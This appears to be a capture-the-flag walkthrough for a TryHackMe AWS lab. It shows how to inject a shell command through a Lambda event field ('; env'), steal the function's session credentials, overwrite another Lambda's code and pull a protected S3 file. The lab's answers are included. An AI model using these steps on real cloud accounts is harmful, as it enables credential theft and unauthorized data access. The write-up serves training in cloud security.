# Lambda - Data Exfiltration

## Mission brief
The Uruks of Mordor have hired you to get access to a CryptoWallet in the AWS Account belonging to a rival gang of Uruk-hai. The gang has obtained some AWS read-only AWS credentials to the target account through means you don't want to ask about. Unfortunately, the CryptoWallet is in an S3 Bucket protected by a VPC Endpoint policy. You cannot access it from anywhere except the VPC.
For this challenge, the read-only credentials are the same ones provided by the TryHackMe environment, so continue to use them. You will want to leverage your AttackBox for this exercise. 

## Reconnaissance of the Buckets in the Environment
- Run the following commands for 

```bash
aws s3 ls
aws s3 ls s3://$BUCKET_NAME
```
![image](https://github.com/user-attachments/assets/ddd7e771-ad06-48af-a856-848a696de384)

- As seen from the screenshot, only the first bucket `mauhur-coins-637423357278` has some items in it. Copy the items to the local machine

```bash
aws s3 cp s3://mauhur-coins-637423357278/password.txt .
```

![image](https://github.com/user-attachments/assets/70401c1d-4b32-434e-8e84-a596000ec7f0)

- We get a permission error, indicating the user only has read permission on the S3 bucket. In fact, we can confirm this by running

```bash

aws s3api get-bucket-policy --bucket mauhur-coins-637423357278 --query Policy --ouput text | jq .
```

![image](https://github.com/user-attachments/assets/cea07b8e-d93c-4033-a7eb-4236a2d18aaf)

- Also, from the above screenshot, we see that there's only a VPC that has access to the s3 bucket `vpce-030a142134efd2262`
- This VPC will be our target. Run the followinnng commands for enumeration

```bash
aws ec2 describe-vpc-endpoints
```

![image](https://github.com/user-attachments/assets/50f4a6c3-a292-4699-ba10-0e66632d5b0b)

```bash
aws ec2 describe-vpcs
```

![image](https://github.com/user-attachments/assets/6920b218-6251-4d89-995a-3c58ff7491af)

- There is a piece of information that stands out. We see Mahur's VPC in the above screenshot, with a warning "DO NOT USE". So if we get access to this VPC, we can get a hold of the S3 bucket.

**What is the NotAction value in the policy for the coins bucket?**

`-> s3:PutObject`

**What is the Name of the VPC we need to target?**

`-> Mauhur's VPC - Do not Use`

- In this scenario, the vitim only has some Lambda function to run. We can inpsect these functions to see what they contain.

## Enumerate Lambda functions
Run the following command to get the list of Lambda functions

```bash
aws lambda list-functions >> lambda-functions.json
```

Use the following script to enumerate the attached policies

```bash
FUNCTIONS="list-images download-images"

for f in $FUNCTIONS ; do
    ROLE=`aws lambda get-function --function-name $f --query Configuration.Role --output text | awk -F\/ '{print $NF}'`
    echo "$f has $ROLE with these managed policies:"
    aws iam list-attached-role-policies --role-name $ROLE
    for p in `aws iam list-role-policies  --role-name $ROLE --query PolicyNames --output text` ; do
        echo "$ROLE for $f has inline policy $p:"
        aws iam get-role-policy --role-name $ROLE --policy-name $p
    done
done
```

As a reuslts, we see some Lambda functions handling images: One list content of the bucket and one downloads the content. 
Amongst these two functions, only the one that downloads images has our targeted VPC configured -> Download images function will be the main target

**Which Lambda function has the AWSLambda_FullAccess managed policy attached to it?**

`-> list-images`

**Which Lambda function has the IAM permissions to access any S3 Object in any S3 Bucket in this account?**

`-> download-images`

## Analyze Lambda functions
Let's go over what we've done so far. We need to target `download-images` lambda function which is configured in a targeted VPC that has full permission over the interested S3 bucket.
Since we have `AWSLambda_FullAccess` permission on the 'list-images` function, we can leverage that to change the code in `donwload-images` function.
We can analyze both functions by downloading them:

```bash
# Retrieve the Lambda function URL
aws lambda get-function --function-name list-images --query Code.Location --output text

# Download the function and save it to a zip file
curl -s $URL -o list-images.zip

# Make a new directory for the function an unzip the file
mkdir list-images
unzip list-images.zip -d list-images
```

We can leverage the following script to do the same thing:

```bash
FUNCTIONS="list-images download-images"
for f in $FUNCTIONS ; do
    URL=`aws lambda get-function --function-name $f --query Code.Location --output text`
    curl -s $URL -o $f.zip
    mkdir $f
    unzip $f.zip -d $f
done
```
**Who gave the list-images function's author the vulnerable CLI command to run?**
Inspect the two functions and we get the answer in one of those two.

`-> Uglúk`

### Analyzing the `list-images` function
As we can see, the code runs a simple AWS CLI command which does not have input sanitized. 

```bash
f"aws s3 ls s3://{os.environ['IMAGE_BUCKET']}/{event['prefix']}"
```

We can inject a command into this line of code. When running this Lambda function with the following `payload.json`

```json
{
    "prefix": " ; env "
}
```

The resulting commdand looks like `aws s3 ls s3://{os.environ['IMAGE_BUCKET']}; env`, which prints out all environment variables.
Run the following command to invoke the `list-images` function:

```bash
aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
cat output.json | jq -r . | grep AWS
```

Before moving on, let's modify the `download-images` function:
- On the line `Bucket=os.environ['IMAGE_BUCKET']`, change to `Bucket='mauhur-coins-XXXXXXXXXXXX'`
- Zip this modified `index.py` to update the `download-images' function.
  
```bash
zip -r ../compromised.zip index.py
```

## EXfiltrate credentials
From the above `payload.json` and the  `index.py` file, invoke the `list-images` function

```bash
aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
cat output.json | jq -r . | grep AWS
```

Take note of the following key-value pairs: `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `AWS_ACCESS_KEY_ID`
Open a new terminal and update the environemnt variables:

```bash
user@machine$ export AWS_SESSION_TOKEN=REDACTED
user@machine$ export AWS_SECRET_ACCESS_KEY=REDACTED
user@machine$ export AWS_ACCESS_KEY_ID=ASIAREDACTED
```

![image](https://github.com/user-attachments/assets/12881229-ff9e-4586-b65e-d81620d75958)

Verify we're using the Lambda function's credentials:

```bash
aws sts get-caller-identity
```

![image](https://github.com/user-attachments/assets/18c38d0d-280e-4698-aff2-8070f736b903)

Now with this new credentials, we can update the `download-images` function using

```bash
aws lambda update-function-code --region us-east-1 --function-name download-images --zip-file fileb://compromised.zip
```

Create `payload2.json` file

```json
{"object_key": "password.txt" }
```

Invoke the compromised function

```
aws lambda invoke --function-name download-images --payload fileb://payload2.json output2.json
```

And we should get the password in `output2.json`

**What's the value of the AWS_EXECUTION_ENV environment variable?**

`-> AWS_Lambda_python3.9`

**What is the secret phrase in password.txt?**

`-> Do you know how the orc first came to be? They were elves once taken by the dark powers. 
Tortured and mutilated, a ruined and terrible form of life.`

**Which managed policy seems harmless but should not be used lightly?**

`-> ReadOnlyAccess `
